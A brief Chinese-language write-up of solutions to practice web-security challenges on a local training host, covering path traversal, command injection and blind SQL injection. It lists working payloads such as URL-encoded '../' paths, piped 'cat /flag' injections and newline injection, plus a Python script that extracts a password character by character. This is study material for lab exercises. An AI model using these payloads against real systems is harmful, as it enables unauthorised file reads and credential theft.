# Web Security

## Path Traversal 1

- 根据路径遍历，考虑到请求`http://challenge.localhost/../../flag`，失败
- 需要进行url编码：`http://challenge.localhost/..%2F..%2Fflag`，得到flag

## Path Traversal 2

- 根据路径遍历，采用第一种方式`http://challenge.localhost/..%2F..%2Fflag`，发现被过滤
- 进入到fortunes中采用第一种方式，相当于以文件形式访问，`http://challenge.localhost/fortunes/..%2F..%2F..%2Fflag`，得到flag

## CMDi 1

- 执行`/flag | cat /flag`即可

## CMDi 2

- 执行`/flag | cat /flag`即可

## CMDi 3

- 绕过单引号，执行`/' | cat '/flag`即可

## CMDi 4

- 中间注入，直接执行`Asian | cat /flag | cat`即可

## CMDi 5

- 主页面没有输出，所以我们需要把运行结果重定向到文件中，执行`/flag | cat /flag > /challenge/output`即可，然后去`cat /challenge/output`即可获取

## CMDi 6

- 大部分能用到的字符都被过滤了，考虑用换行符结束上一个命令，换行符经过URL编码后是`%0A`，所以注入`%0A cat /flag`即可。



## SQLi 5

```python
import string
import requests

searchspace = ''.join(chr(i) for i in range(32, 127)) 
solution = ''
url = "http://challenge.localhost:80"

while True:
    found = False
    for char in searchspace:
        payload = f"admin' AND SUBSTR(password, {len(solution)+1}, 1) = '{char}'-- -"
        data = {
            "username": payload,
            "password": "irrelevant"
        }

        response = requests.post(url, data=data)

        if "Hello" in response.text:
            solution += char
            print(f"[+] Found so far: {solution}")
            found = True
            break

    if not found:
        print("[*] Done. Final password:", solution)
        break
```

